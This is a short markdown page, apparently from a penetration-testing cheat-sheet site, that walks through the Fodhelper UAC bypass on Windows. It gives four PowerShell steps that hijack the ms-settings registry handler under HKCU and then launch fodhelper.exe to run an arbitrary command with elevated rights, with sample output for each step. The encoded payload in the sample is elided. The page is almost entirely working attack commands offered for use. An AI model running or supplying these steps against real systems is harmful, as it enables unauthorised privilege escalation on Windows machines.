---
title: "UAC Bypass"
tags: ["UAC Bypass", "Windows Security", "Privilege Escalation", "Fodhelper", "Windows Registry", "PowerShell", "System Administration"]
---

### Leveraging Auto-elevated Windows Binaries

{{< tab set1 tab1 >}}Fodhelper{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Create Registry Key for Command Execution

```console
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
```

```console {class="sample-code"}
PS C:\Users\rainbow\Desktop> New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force


    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open


Name                           Property                                                                                
----                           --------                                                                                
command
```

#### 2. Set DelegateExecute Property to Enable Command

```console
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
```

```console {class="sample-code"}
PS C:\Users\rainbow\Desktop> New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force


DelegateExecute : 
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry
```

#### 3. Configure Command to Execute with Elevated Privileges

```console
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "<CMD>" -Force
```

```console {class="sample-code"}
PS C:\Users\rainbow\Desktop> Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -e ---[SNIP]---" -Force
```

#### 4. Execute Fodhelper to Trigger UAC Bypass

```console
C:\Windows\System32\fodhelper.exe
```

```console {class="sample-code"}
C:\Windows\System32\fodhelper.exe
```

{{< /tabcontent >}}
